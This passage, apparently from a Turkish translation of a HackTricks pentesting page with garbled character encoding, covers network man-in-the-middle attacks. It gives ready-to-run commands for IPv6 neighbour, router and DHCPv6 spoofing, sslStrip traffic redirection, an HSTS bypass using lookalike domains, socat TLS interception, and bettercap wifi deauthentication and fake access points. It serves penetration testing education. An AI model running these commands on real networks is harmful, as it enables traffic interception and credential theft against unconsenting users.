TarayÄ±cÄ±lar genellikle **Web Proxy Auto-Discovery (WPAD) protokolÃ¼nÃ¼ otomatik olarak proxy ayarlarÄ±nÄ± almak iÃ§in kullanÄ±r**. Bu, bir sunucudan yapÄ±landÄ±rma ayrÄ±ntÄ±larÄ±nÄ± almak anlamÄ±na gelir, Ã¶zellikle "http://wpad.example.org/wpad.dat" gibi bir URL aracÄ±lÄ±ÄŸÄ±yla. Bu sunucunun istemciler tarafÄ±ndan keÅŸfi Ã§eÅŸitli mekanizmalarla gerÃ§ekleÅŸebilir:

* **DHCP** aracÄ±lÄ±ÄŸÄ±yla, burada keÅŸif Ã¶zel bir kod 252 giriÅŸi kullanÄ±larak kolaylaÅŸtÄ±rÄ±lÄ±r.
* **DNS** aracÄ±lÄ±ÄŸÄ±yla, bu yerel alanda _wpad_ olarak etiketlenmiÅŸ bir ana bilgisayar adÄ± aramayÄ± iÃ§erir.
* **Microsoft LLMNR ve NBT-NS** aracÄ±lÄ±ÄŸÄ±yla, DNS sorgularÄ±nÄ±n baÅŸarÄ±sÄ±z olduÄŸu durumlarda kullanÄ±lan yedekleme mekanizmalarÄ±dÄ±r.

YanÄ±tlayÄ±cÄ± aracÄ±, **kÃ¶tÃ¼ niyetli bir WPAD sunucusu** olarak hareket ederek bu protokolden yararlanÄ±r. Ä°stemcileri kendisine baÄŸlanmaya yÃ¶nlendirmek iÃ§in DHCP, DNS, LLMNR ve NBT-NS kullanÄ±r. YanÄ±tlayÄ±cÄ± kullanarak hizmetlerin nasÄ±l taklit edilebileceÄŸi hakkÄ±nda daha fazla bilgi iÃ§in [bunu kontrol edin](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [SSDP ve UPnP cihazlarÄ±nÄ± Spoofing](spoofing-ssdp-and-upnp-devices.md)

AÄŸda farklÄ± hizmetler sunarak bir **kullanÄ±cÄ±yÄ±** bazÄ± **dÃ¼z metin kimlik bilgilerini** girmeye **kandÄ±rmaya** Ã§alÄ±ÅŸabilirsiniz. **Bu saldÄ±rÄ± hakkÄ±nda daha fazla bilgi iÃ§in** [**SSDP ve UPnP CihazlarÄ±nÄ± Spoofing**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 KomÅŸu Spoofing

Bu saldÄ±rÄ±, ARP Spoofing'e Ã§ok benzer ancak IPv6 dÃ¼nyasÄ±nda geÃ§erlidir. KurbanÄ±n, GW'nin IPv6'sÄ±nÄ±n saldÄ±rganÄ±n MAC'ine sahip olduÄŸunu dÃ¼ÅŸÃ¼nmesini saÄŸlayabilirsiniz.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 YÃ¶nlendirici Ä°lanÄ± SahteciliÄŸi/BoÄŸma

BazÄ± iÅŸletim sistemleri, aÄŸda gÃ¶nderilen RA paketlerinden varsayÄ±lan olarak geÃ§idi yapÄ±landÄ±rÄ±r. SaldÄ±rganÄ± IPv6 yÃ¶nlendiricisi olarak ilan etmek iÃ§in ÅŸunu kullanabilirsiniz:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP sahteciliÄŸi

VarsayÄ±lan olarak bazÄ± iÅŸletim sistemleri, aÄŸda bir DHCPv6 paketi okuyarak DNS'i yapÄ±landÄ±rmaya Ã§alÄ±ÅŸÄ±r. ArdÄ±ndan, bir saldÄ±rgan kendisini DNS olarak yapÄ±landÄ±rmak iÃ§in bir DHCPv6 paketi gÃ¶nderebilir. DHCP ayrÄ±ca kurban iÃ§in bir IPv6 saÄŸlar.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (sahte sayfa ve JS kodu enjeksiyonu)

## Ä°nternet SaldÄ±rÄ±larÄ±

### sslStrip

Bu saldÄ±rÄ±nÄ±n temel olarak yaptÄ±ÄŸÄ± ÅŸey, eÄŸer **kullanÄ±cÄ±** bir **HTTP** sayfasÄ±na **eriÅŸmeye** Ã§alÄ±ÅŸÄ±yorsa ve bu sayfa **HTTPS** versiyonuna **yÃ¶nlendiriyorsa**. **sslStrip**, **istemci ile** bir **HTTP baÄŸlantÄ±sÄ±nÄ±** ve **sunucu ile** bir **HTTPS baÄŸlantÄ±sÄ±nÄ±** **sÃ¼rdÃ¼rerek**, baÄŸlantÄ±yÄ± **dÃ¼z metin** olarak **dinleyebilmesini** saÄŸlar.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Daha fazla bilgi [burada](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ ve dns2proxy ile HSTS'yi atlama

**sslStrip+ ve dns2proxy** arasÄ±ndaki **fark**, **sslStrip**'e karÅŸÄ±, Ã¶rneÄŸin _**www.facebook.com**_ **adresini** _**wwww.facebook.com**_ **olarak** **yÃ¶nlendirmeleridir** (not: **ekstra** "**w**" var) ve bu **alan adÄ±nÄ±n adresini saldÄ±rgan IP'si olarak ayarlayacaklardÄ±r**. Bu ÅŸekilde, **istemci** _**wwww.facebook.com**_ **(saldÄ±rgan)** ile **baÄŸlanacak**, ancak arka planda **sslstrip+** **gerÃ§ek baÄŸlantÄ±yÄ±** **www.facebook.com** ile **https** Ã¼zerinden **sÃ¼rdÃ¼recektir**.

Bu tekniÄŸin **amacÄ±**, _**wwww**.facebook.com_ **tarayÄ±cÄ±nÄ±n** **Ã¶nbelleÄŸine** **kaydedilmeyeceÄŸi** iÃ§in **HSTS'yi** **atlamaktÄ±r**; bÃ¶ylece tarayÄ±cÄ± **facebook kimlik doÄŸrulamasÄ±nÄ± HTTP Ã¼zerinden** **gerÃ§ekleÅŸtirmeye** **kandÄ±rÄ±lacaktÄ±r**.\
Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, kurbanÄ±n Ã¶ncelikle [http://www.faceook.com](http://www.faceook.com) adresine eriÅŸmeye Ã§alÄ±ÅŸmasÄ± gerektiÄŸini unutmayÄ±n, https deÄŸil. Bu, bir http sayfasÄ±ndaki baÄŸlantÄ±larÄ± deÄŸiÅŸtirerek yapÄ±labilir.

Daha fazla bilgi [burada](https://www.bettercap.org/legacy/#hsts-bypass), [burada](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) ve [burada](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip veya sslStrip+ artÄ±k Ã§alÄ±ÅŸmÄ±yor. Bunun nedeni, tarayÄ±cÄ±larda Ã¶nceden kaydedilmiÅŸ HSTS kurallarÄ±nÄ±n olmasÄ±dÄ±r, bu nedenle bir kullanÄ±cÄ± "Ã¶nemli" bir alan adÄ±na ilk kez eriÅŸse bile HTTPS Ã¼zerinden eriÅŸecektir. AyrÄ±ca, Ã¶nceden kaydedilmiÅŸ kurallar ve diÄŸer Ã¼retilen kurallar** [**`includeSubdomains`**](https://hstspreload.appspot.com) **bayraÄŸÄ±nÄ± kullanabilir, bu nedenle** _**wwww.facebook.com**_ **Ã¶rneÄŸi artÄ±k Ã§alÄ±ÅŸmayacaktÄ±r Ã§Ã¼nkÃ¼** _**facebook.com**_ **`includeSubdomains` ile HSTS kullanmaktadÄ±r.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP dinleme portu
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL dinleme portu

#### Anahtarlar ve kendinden imzalÄ± sertifika oluÅŸturun
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Sertifika kullanarak dinleme
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Sertifika kullanarak dinleme yapÄ±n ve ana bilgisayarlara yÃ¶nlendirin
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Bazen, eÄŸer mÃ¼ÅŸteri CA'nÄ±n geÃ§erli olduÄŸunu kontrol ederse, **bir CA tarafÄ±ndan imzalanmÄ±ÅŸ baÅŸka bir ana bilgisayar adÄ± sertifikasÄ± sunabilirsiniz**.\
DiÄŸer ilginÃ§ bir test, **istenen ana bilgisayar adÄ± iÃ§in ancak kendinden imzalÄ± bir sertifika sunmaktÄ±r**.

Test edilecek diÄŸer ÅŸeyler, sertifikayÄ± geÃ§erli bir CA olmayan geÃ§erli bir sertifika ile imzalamayÄ± denemek veya geÃ§erli bir genel anahtarÄ± kullanarak, gerÃ§ek Ã¶zel anahtarla herhangi bir ÅŸeyi deÅŸifre etmesine gerek olmayan bir algoritmayÄ± (diffie hellman gibi) zorlamaktÄ±r ve mÃ¼ÅŸteri gerÃ§ek Ã¶zel anahtarÄ±n bir denemesini (bir hash gibi) talep ettiÄŸinde sahte bir deneme gÃ¶ndermek ve mÃ¼ÅŸterinin bunu kontrol etmemesini beklemektir.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktif KeÅŸif NotlarÄ±

Bir UDP paketi, istenen porta sahip olmayan bir cihaza gÃ¶nderildiÄŸinde, bir ICMP (Port UlaÅŸÄ±lmaz) gÃ¶nderildiÄŸini dikkate alÄ±n.

### **ARP keÅŸfi**

ARP paketleri, aÄŸ iÃ§inde hangi IP'lerin kullanÄ±ldÄ±ÄŸÄ±nÄ± keÅŸfetmek iÃ§in kullanÄ±lÄ±r. PC, her olasÄ± IP adresi iÃ§in bir istek gÃ¶ndermeli ve yalnÄ±zca kullanÄ±lanlar yanÄ±t verecektir.

### **mDNS (Ã§oklu yayÄ±n DNS)**

Bettercap, **\_services\_.dns-sd.\_udp.local** iÃ§in MDNS isteÄŸi gÃ¶nderir (her X ms'de) ve bu paketi gÃ¶ren makine genellikle bu isteÄŸe yanÄ±t verir. ArdÄ±ndan, yalnÄ±zca "services" yanÄ±t veren makineleri arar.

**AraÃ§lar**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Ä°sim Sunucusu)**

Bettercap, "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" ismini sormak iÃ§in 137/UDP portuna paketler yayÄ±nlar.

### **SSDP (Basit Hizmet KeÅŸif ProtokolÃ¼)**

Bettercap, her tÃ¼rlÃ¼ hizmeti aramak iÃ§in SSDP paketleri yayÄ±nlar (UDP Port 1900).

### **WSD (Web Hizmeti KeÅŸfi)**

Bettercap, hizmetleri aramak iÃ§in WSD paketleri yayÄ±nlar (UDP Port 3702).

## Referanslar

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **AÄŸ GÃ¼venliÄŸi DeÄŸerlendirmesi: AÄŸÄ±nÄ±zÄ± TanÄ±yÄ±n (3. baskÄ±)**
* **Pratik IoT Hacking: Nesnelerin Ä°nternetine SaldÄ±rmanÄ±n Kesin Rehberi. Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood tarafÄ±ndan**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Hata avÄ± ipucu**: **Intigriti** iÃ§in **kayÄ±t olun**, **hackerlar tarafÄ±ndan, hackerlar iÃ§in oluÅŸturulmuÅŸ bir premium hata avÄ± platformu**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katÄ±lÄ±n ve **$100,000**'a kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± Ekip UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± Ekip UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
